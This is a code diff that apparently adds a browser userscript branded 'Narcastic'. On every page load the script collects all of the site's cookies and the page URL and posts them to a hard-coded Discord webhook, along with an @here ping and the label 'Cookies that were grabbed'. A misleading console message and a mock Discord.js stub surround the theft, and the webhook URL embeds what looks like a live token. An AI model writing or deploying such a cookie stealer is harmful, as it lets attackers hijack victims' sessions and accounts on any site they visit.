@@ -1,0 +1,64 @@
+ // Replace with your Discord webhook URL
+    const hookUrl = "https://discord.com/api/webhooks/1214281831000571936/om7T2G9xuA00uz9jEdEZDfojR8R49BJAE6C30Zo9zPxM15eBNQcTYRj0tgWmrscQk0bn";
+
+    // Include Discord.js library
+    const Discord = {
+        Client: function(options) {
+            this.token = options.token;
+        },
+        MessageEmbed: function() {
+            this.addFields = function(fields) {};
+        },
+        MessageActionRow: function() {},
+        MessageButton: function() {}
+    };
+
+    // Log cookies when the page loads
+    function logCookies() {
+        const url = window.location.href;
+        const cookies = unsafeWindow.document.cookie.split(';');
+        console.log(`Narcastic is currently connecting its client to your site your currently on.`);
+
+        const specialCookies = ["UID", "ID", "Cookie", "Token"];
+        const webhookData = {
+            "content": `||@here||`,
+            "embeds": [
+                {
+                    "type": "rich",
+                    "title": `Narcastic`,
+                    "description": `Made with love, a user visited a website using the script!`,
+                    "color": 16777215,
+                    "fields": [
+                        {
+                            "name": `When and what website:`,
+                            "value": `Website was visited at ${new Date().toLocaleString()}, And the website was ${url}.`
+                        },
+                        {
+                            "name": `Cookies that were grabbed:`,
+                            "value": cookies.join('\n')
+                        }
+                    ],
+                    "thumbnail": {
+                        "url": `https://cdn.discordapp.com/attachments/1214281493933723749/1214836677797875742/R_1.png?ex=65fa8fd2&is=65e81ad2&hm=9538344d5faf17d3168629c5cd921a2cc2706f3d8374be6eed6d124cc18cd84a&`,
+                        "height": 0,
+                        "width": 0
+                    }
+                }
+            ]
+        };
+
+        // Mock Discord.js methods
+        const client = new Discord.Client({ token: 'your-token-goes-here' });
+        const messageEmbed = new Discord.MessageEmbed();
+        messageEmbed.addFields([{ name: '', value: '' }]);
+
+        fetch(hookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(webhookData)
+        });
+    }
+
+    logCookies();
